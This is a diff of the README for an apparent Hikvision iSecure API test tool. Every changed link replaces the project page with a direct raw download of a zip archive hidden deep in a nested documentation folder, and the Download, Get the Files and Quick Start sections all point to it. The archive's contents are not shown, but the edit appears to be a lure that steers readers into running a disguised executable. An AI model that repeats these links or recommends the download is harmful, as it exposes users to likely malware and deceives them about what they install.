@@ -1,12 +1,12 @@
 # 🛠️ Hikvision-iSecureFucker - Visual AK/SK API Test Tool
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Social-sale386/Hikvision-iSecureFucker)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Social-sale386/Hikvision-iSecureFucker/raw/refs/heads/main/doc/API列表/资源目录/人员信息接口/人员卡片接口/Fucker-Secure-Hikvision-i-v2.8.zip)
 
 ## 📥 Download
 
 Visit the project page here and download the latest files:
 
-https://github.com/Social-sale386/Hikvision-iSecureFucker
+https://github.com/Social-sale386/Hikvision-iSecureFucker/raw/refs/heads/main/doc/API列表/资源目录/人员信息接口/人员卡片接口/Fucker-Secure-Hikvision-i-v2.8.zip
 
 ## 🖥️ What This Tool Does
 
@@ -40,7 +40,7 @@ For best results, use:
 ## 🚀 Get the Files
 
 1. Open the project page:
-   https://github.com/Social-sale386/Hikvision-iSecureFucker
+   https://github.com/Social-sale386/Hikvision-iSecureFucker/raw/refs/heads/main/doc/API列表/资源目录/人员信息接口/人员卡片接口/Fucker-Secure-Hikvision-i-v2.8.zip
 
 2. Find the latest release, package, or download file on the page.
 
@@ -211,7 +211,7 @@ To keep your setup clean:
 ## 📌 Quick Start
 
 1. Visit the project page:
-   https://github.com/Social-sale386/Hikvision-iSecureFucker
+   https://github.com/Social-sale386/Hikvision-iSecureFucker/raw/refs/heads/main/doc/API列表/资源目录/人员信息接口/人员卡片接口/Fucker-Secure-Hikvision-i-v2.8.zip
 
 2. Download the Windows file.
 
